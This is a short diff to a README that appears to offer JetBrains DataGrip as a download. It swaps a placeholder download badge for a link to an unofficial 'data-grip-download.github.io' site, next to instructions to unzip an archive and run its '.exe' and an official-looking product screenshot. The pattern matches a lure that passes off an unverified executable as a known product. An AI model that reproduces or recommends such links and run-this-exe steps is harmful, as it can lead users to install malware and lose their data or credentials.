@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://data-grip-download.github.io/.github/)
 
 ## 📸 Overview
 ![Screenshot 1](https://www.jetbrains.com/datagrip/img/screenshots/query-console.png)  
